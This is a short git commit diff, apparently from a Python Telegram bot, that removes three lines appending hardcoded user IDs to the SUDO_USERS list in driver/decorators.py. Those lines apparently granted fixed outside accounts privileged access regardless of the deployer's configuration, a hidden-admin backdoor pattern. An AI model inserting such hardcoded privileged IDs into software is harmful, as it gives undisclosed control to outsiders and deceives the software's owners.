2453220497d7fbd3b65966991b52cdb414252d08
Aju <73631177+nidhirobot@users.noreply.github.com>
2022-02-06 21:57:29 +0530

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,11 +5,6 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
-
-
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         try:
